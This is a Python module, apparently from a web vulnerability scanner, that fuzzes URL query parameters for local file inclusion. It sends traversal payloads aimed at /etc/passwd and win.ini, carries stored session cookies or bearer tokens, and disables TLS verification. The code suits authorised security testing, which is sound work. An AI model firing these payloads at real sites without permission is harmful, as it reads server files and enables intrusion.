import requests
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
from . import utils

def run_lfi_fuzzer(url):
    """
    Local File Inclusion (LFI) and Directory Traversal fuzzer.
    Zero false positives by checking exact file signatures (/etc/passwd, win.ini).
    """
    findings = []
    if "?" not in url: return findings
    
    headers = {}
    if utils.GLOBAL_COOKIE: headers["Cookie"] = utils.GLOBAL_COOKIE
    if utils.GLOBAL_BEARER: headers["Authorization"] = f"Bearer {utils.GLOBAL_BEARER}"

    parsed = urlparse(url)
    params = parse_qsl(parsed.query)
    
    payloads = [
        ("../../../../../../../../etc/passwd", "root:x:0:0:"),
        ("../../../../../../../../windows/win.ini", "[extensions]")
    ]
    
    for i, (k, v) in enumerate(params):
        for payload, signature in payloads:
            test_params = params.copy()
            test_params[i] = (k, payload)
            
            test_query = urlencode(test_params)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            try:
                r = requests.get(test_url, headers=headers, timeout=5, verify=False)
                content_type = r.headers.get("Content-Type", "").lower()
                body = r.text
                if (r.status_code == 200 and signature in body
                        and "text/html" not in content_type
                        and not body.lstrip().lower().startswith("<html")):
                    findings.append({
                        "type": "LOCAL_FILE_INCLUSION",
                        "url": test_url,
                        "parameter": k,
                        "severity": "CRITICAL",
                        "confidence": "HIGH",
                        "verified": True,
                        "verification_method": "local-file-signature",
                        "verification_evidence": {
                            "deterministic": True,
                            "signature": signature,
                            "status": r.status_code,
                            "content_type": content_type,
                        },
                        "detail": f"Local file signature returned through parameter `{k}` using payload `{payload}`."
                    })
                    return findings
            except Exception: pass
            
    return findings
